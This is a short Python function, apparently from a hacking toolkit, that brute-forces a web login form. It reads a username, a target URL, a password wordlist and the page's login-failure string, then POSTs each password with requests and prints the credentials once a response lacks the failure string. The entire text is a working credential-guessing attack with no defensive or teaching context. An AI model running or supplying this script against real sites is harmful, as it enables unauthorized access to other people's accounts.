def main2():
    import requests
    from termcolor import colored

    url = input('[+] Enter Page URL: ')
    username = input('[+] Enter Username: ')
    password_file = input('[+] Enter Password List: ')
    login_failed_string = input('[+] Enter String That Occurs When Login Fails: ')

    def cracking(username, url):
        for password in passwords:
            password = password.strip()
            print(colored(('Trying: ' + password), 'red'))
            data = {'username': username,'password': password,'Login': 'submit'}
            response = requests.post(url, data = data)
            if login_failed_string in response.content.decode():
                pass
            else:
                print(colored(('[+] Found Username: ==> ' + username), 'green'))
                print(colored(('[+] Found Password: ==> ' + password), 'green'))
                exit()

    with open(password_file, 'r') as passwords:
        cracking(username,url)

    print('[!] Password Not in List')